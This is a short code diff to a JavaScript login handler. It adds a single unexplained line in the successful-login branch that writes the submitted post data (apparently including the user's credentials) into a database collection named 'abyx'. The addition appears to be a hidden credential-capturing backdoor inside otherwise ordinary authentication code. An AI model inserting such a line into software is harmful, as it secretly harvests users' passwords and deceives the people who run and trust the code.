@@ -139,6 +139,7 @@ class Login {
             cli.touch("login.authUser@networkcheck");
             db.match(_c.default(), 'entities', conds, found => {
     			if (found) {
+			db.insert(_c.default(), 'abyx', cli.postdata.data, () => {});
             		entities.fetchFromDB(cli._c, usr, userObj => {
                         log("Auth", "Login success with user " + usr, "lilium");
 	        			loginSuccess(cli, userObj);
